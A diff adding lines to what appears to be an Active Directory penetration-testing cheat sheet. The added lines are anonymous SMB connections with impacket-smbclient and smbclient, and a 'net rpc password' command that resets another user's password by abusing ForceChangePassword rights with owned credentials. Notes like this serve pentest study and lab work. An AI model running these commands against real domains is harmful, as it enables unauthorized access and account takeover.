@@ -251,8 +251,13 @@ schtasks /query /fo LIST /v /TN "\Microsoft\Task Name"
 
 #Anonymous SMB login:
 rpcclient -U "" -N testad.local
+impacket-smbclient 10.10.10.1
+smbclient \\10.10.10.1
 #Enumerate domain users with rpcclient:
 enumdomuser
+
+#If you have ForceChangePassword over another user, you can change the user's password it over RPC
+net rpc password "targetuser" "p4s5-w0rD" -U "testad.local"/"owneduser"%'owned_user_password' -S "10.10.10.1"
 
 #Check for autologin users from registry with PowerShell
 $RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
